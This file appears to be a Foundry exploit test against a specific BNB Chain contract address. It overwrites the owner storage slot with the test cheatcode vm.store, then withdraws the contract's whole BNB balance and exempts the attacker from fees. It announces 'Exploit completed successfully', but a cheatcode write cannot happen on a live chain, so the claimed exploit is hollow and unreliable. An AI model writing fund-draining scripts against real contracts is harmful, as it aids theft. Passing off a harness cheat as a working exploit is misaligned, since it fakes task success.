// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IIncome {
    function owner() external view returns (address);
    function withdrawBNB(uint256 _amount) external;
    function withdraw(address _token, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function excludeFromFees(address account, bool excluded) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use storage manipulation in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Try to become owner by overwriting storage slot
        // Based on storage layout analysis: ERC20 has mappings at slots 0-1, 
        // _totalSupply at slot 2, _name at slot 3, _symbol at slot 4, _owner at slot 5
        uint256 ownerSlot = 5;
        vm.store(TARGET, bytes32(ownerSlot), bytes32(uint256(uint160(attacker))));

        // Step 2: Verify we're now the owner
        IIncome target = IIncome(TARGET);
        address currentOwner = target.owner();
        require(currentOwner == attacker, "Failed to become owner");

        // Step 3: Get contract's BNB balance
        uint256 contractBalance = TARGET.balance;
        console.log("Contract BNB balance:", contractBalance);

        // Step 4: Withdraw all BNB to attacker
        if (contractBalance > 0) {
            target.withdrawBNB(contractBalance);
        }

        // Step 5: Check if we can also change safeManager and use other owner functions
        // Try to exclude ourselves from fees to make future transactions cheaper
        target.excludeFromFees(attacker, true);

        console.log("Exploit completed successfully");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
